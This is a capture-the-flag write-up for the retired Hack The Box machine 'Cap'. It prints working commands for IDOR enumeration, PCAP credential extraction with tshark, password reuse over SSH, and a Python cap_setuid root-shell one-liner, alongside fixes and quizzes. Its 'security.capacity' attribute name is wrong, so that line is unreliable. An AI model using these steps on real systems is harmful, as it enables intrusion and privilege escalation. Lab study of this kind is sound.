# Cap — Active Learning Writeup

| Target | Detail |
| :--- | :--- |
| **OS** | Linux |
| **Difficulty** | Easy (retired, released 2021-06-05) |
| **IP Address** | `10.129.51.175` (VPN `tun0`) |
| **Owned** | 2026-09-27 — User ✅ Root ✅ |
| **Key Concepts** | IDOR, PCAP credential harvesting, Linux Capabilities |
| **Time** | ~5 min |

**Attack path (TL;DR):**

```text
nmap → Gunicorn "Security Dashboard" on :80
     → IDOR on /data/<id> → /download/0 serves a PCAP capture
     → tshark pulls FTP creds from the capture
     → FTP login → user.txt → SSH with the same password
     → python3.8 carries cap_setuid → root shell → root.txt
```

---

## 1. Reconnaissance & Surface Analysis

### Raw Port Scan

```bash
nmap -sC -sV -oA recon 10.129.51.175
```

```text
-sC : run default scripts (banner grabbing / light enum — no manual guessing)
-sV : detect service versions (needed later for CVE search)
-oA : save output in three files (txt + nmap + gnmap)
```

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    gunicorn (Security Dashboard)
```

### Initial Observations

- **Port 21 (FTP):** vsftpd — credentials unknown so far; anonymous
  login is usually disabled on modern setups.
- **Port 22 (SSH):** brute-force is a time sink until we own a password.
- **Port 80 (HTTP):** an application called "Security Dashboard" —
  custom code means custom logic flaws, and dashboards handle objects
  (files, tasks, captures) which are classic IDOR material.

### 🧠 Pause & Predict

<details>
<summary><b>Think first:</b> three ports are open — which one do you
hit first and why?</summary>

Port 80. Web applications carry the highest probability of custom
logic flaws (IDOR, injection, forgotten endpoints) compared to
hardened network services. SSH/FTP only become useful *after* we hold
credentials — and the web app is exactly where those tend to leak.
</details>

## 2. Enumeration & Finding the Seam

### What I Investigated

Fetched the landing page, found an app with tabs like *Security
Tasks*, *File Transfers*, *PCAP Storage* and URL patterns such as
`/data/1` (a task belonging to user id 1).

```text
Command structure:
curl -s <url>            # fetch page silently
for i in $(seq <a> <b>); do curl -s <url>/$i; done   # enumerate numeric IDs
```

### 🧠 Interactive Challenge

<details>
<summary><b>Challenge:</b> you found <code>/data/1</code> showing a
network capture. What is the first test an attacker runs, and why?</summary>

Request adjacent object IDs — <code>/data/0</code>, <code>/data/2</code>.
Default/initial records usually live at index 0. If data loads without
authenticating as its owner, object-level authorization is missing
(IDOR). On this box <code>/download/0</code> handed over a PCAP file
with no ownership check at all.
</details>

### ❌ Failure Log — What I Tried First & Why It Failed

1. Ran `sudo -l` as the foothold user → **Result:** no sudo rules.
   *Takeaway:* sudo access is never default — keep alternate privesc
   vectors ready.
2. Ran `find / -perm -4000 -type f` → **Result:** only standard SUID
   binaries (`su`, `sudo`, `passwd`, ...).
   *Takeaway:* a clean SUID list doesn't mean "no privesc" — it means
   move to the next checklist item.
3. Checked writable `/etc/passwd` and crontabs → **Result:** nothing.
   *Takeaway:* low-hanging fruit exhausted → check file capabilities.
4. Finally ran `getcap -r /` → **HIT.**

### The Breakthrough (Root Cause Breakdown)

**The Flaw #1 — IDOR (Insecure Direct Object Reference):** the server
returns any object you name in the URL without verifying that it
belongs to your session.

**Real-World Analogy:**
> Your hotel key opens room 101 — but you also try room 102 and it
> opens, because the guard (server) never checks whose key it is.

**The Flaw #2 — Cleartext protocol misuse:** the app stores/streams a
network capture, and inside that capture FTP credentials traveled in
plaintext.

<details>
<summary><b>🧠 Mini-challenge:</b> you are given
<code>http://target/item/5</code>. Which requests prove whether access
controls exist?</summary>

Request <code>/item/0</code>, <code>/item/1</code>, <code>/item/-1</code>.
If their data loads without re-authenticating as that owner,
object-level authorization is missing. Fix = server-side ownership
check per request, not just unpredictable IDs.
</details>

## 3. Foothold (Initial Access)

### Command Breakdown

> Skeleton first, execution second.

```text
Syntax structure:
tshark -r <file> -Y <display_filter> -T fields -e <field_name>
```

<details>
<summary><b>Task:</b> extract only FTP usernames and passwords from
the capture — what does the filter look like?</summary>

<code>-Y ftp.request.arg</code> — FTP credentials travel as command
arguments (USER/PASS values), which land in the
<code>ftp.request.arg</code> field. <code>-T fields -e ...</code>
strips packet noise and prints only that value.
</details>

```bash
curl -s -o cap.pcap "http://10.129.51.175/download/0"
tshark -r cap.pcap -Y ftp.request.arg -T fields -e ftp.request.arg
```

```text
-r capture.pcap : read from an offline capture file (not a live interface)
-Y "..."       : Wireshark display filter — keep only matching packets
-T fields -e   : print only the requested field, nothing else
```

```
USER nathan
PASS Buck3tH4TF0RM3!
```

### Credentials Found

```text
nathan : Buck3tH4TF0RM3!
Access Vector: FTP (user flag directly) → SSH (interactive shell, same password)
```

```bash
ftp 10.129.51.175        # login, cat user.txt
ssh nathan@10.129.51.175 # same password — shell beats FTP
```

## 4. Privilege Escalation

### Internal Audits (order matters)

```bash
sudo -l                                 # sudo rules?   → nothing
find / -perm -4000 -type f 2>/dev/null  # SUID?         → standard only
ls -la /etc/passwd /etc/shadow          # writable?     → no
getcap -r / 2>/dev/null                 # capabilities? → HIT
```

### The Misconfiguration

- **Binary:** `/usr/bin/python3.8`
- **Dangerous Permission:** `cap_setuid,cap_net_bind_service+eip`

### 🧠 Privesc Reasoning

<details>
<summary><b>Q:</b> why is <code>cap_setuid</code> on an interpreter
(Python) worse than on a compiled utility?</summary>

An interpreter executes arbitrary system calls directly from an inline
one-liner — no compilation, no separate exploit binary. With
<code>cap_setuid</code>, Python can call <code>os.setuid(0)</code> and
become root even though the file itself is not SUID. A capability is
supposed to be "one key to one door" (here: change UID only) — but
giving that key to a scripting language is like handing a valet the
master car key instead of the trunk key.
</details>

### Root Exploitation

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```text
-c            : run the given string as a Python program (no temp file needed)
os.setuid(0)  : switch the process UID to 0 (root)
os.system(...) : spawn a shell as that UID
```

```bash
whoami        # root
cat /root/root.txt
```

## 5. Flags

> **Rule: flags are never written into these notes** — re-run the box
> to regenerate them (passive readers don't get free flags, and I don't
> get passive memories).

```text
user : <from the FTP/downloaded file — submitted ✓>
root : <after the final privesc — submitted ✓>
```

```bash
htb machine own <flag>
```

## 6. Defense & Remediation (The Sysadmin View)

| Stage | Issue | Secure Fix |
| :--- | :--- | :--- |
| Web | Predictable numeric object IDs, no ownership check (IDOR) | Enforce server-side `record.owner == session.user` on every request; UUIDs as defense-in-depth only |
| Network | Plaintext FTP in use | SFTP/SSH (or FTPS at minimum) — captured traffic then yields zero credentials |
| App | PCAP files downloadable by index | Authenticate downloads + authorize per file |
| OS | `cap_setuid` granted to Python | `sudo setcap -r /usr/bin/python3.8` — interpreters never need capability powers |

## 7. Key Takeaways

1. **IDOR hunting is cheap** — enumerate adjacent object IDs before
   writing any exploit code.
2. **PCAP files are gift boxes** — one `tshark -Y` replaces minutes of
   GUI clicking.
3. **`getcap -r /` belongs in every privesc checklist**, right after
   `sudo -l` and SUID.
4. **Reuse credentials across services** — FTP passwords frequently
   unlock SSH.
5. **A "clean" checklist result is data too** — sudo/SUID being empty
   is exactly what pointed at capabilities.

## 8. 🧠 Active Recall Challenges (Before You Close This Box)

- [ ] **Challenge 1:** `getcap` is not installed on a target — how do
      you enumerate capabilities straight from the filesystem?
      *(Hint: capabilities are stored as extended attributes.)*
- [ ] **Challenge 2:** on your local Kali, attach a temporary
      capability to a Python binary (`sudo setcap cap_setuid+ep
      /usr/bin/python3.X`), verify the exploit trigger, then remove it
      (`sudo setcap -r ...`). Document what breaks if you forget the
      cleanup.
- [ ] **Challenge 3:** re-run Cap with zero notes — reach the user flag
      in under 5 minutes purely from methodology.

<details>
<summary><b>Answers</b> (attempt first, then open)</summary>

1. `getfattr -d -m - -R /usr/bin 2>/dev/null | grep cap_` — or
   `getfattr -n security.capacity <binary>` per file. Capabilities are
   stored in the `security.capacity` extended attribute, so any
   `getfattr`/`xattr` tool can read them.
2. Expected behavior: `python3 -c 'import os; os.setuid(0); os.system("id")'`
   reports `uid=0`. If you skip `setcap -r`, any local user keeps a
   permanent root path — a planted privesc waiting to be found.
3. Personal benchmark — compare your time against your first run and
   note which step still costs the most seconds.
</details>

---

**Final Checklist (before publishing):**
- [ ] Could a newcomer parse every command? (flags broken down)
- [ ] Is the *WHY* of the first move explained? (web before SSH/FTP)
- [ ] Are failures documented? (sudo → SUID → passwd → getcap chain)
- [ ] Does command order match what actually ran? ✓
